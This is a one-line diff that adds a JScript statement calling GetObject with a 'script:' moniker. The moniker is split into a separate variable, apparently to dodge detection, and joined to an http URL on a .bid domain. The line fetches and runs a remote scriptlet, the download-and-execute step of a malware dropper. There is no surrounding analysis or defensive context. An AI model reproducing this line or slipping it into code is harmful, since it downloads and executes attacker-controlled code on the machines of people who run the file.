@@ -1,0 +1,1 @@
+var a = 'script:';GetObject(a+'HTtp://enei15.gsfogllftm.bid/?1/')
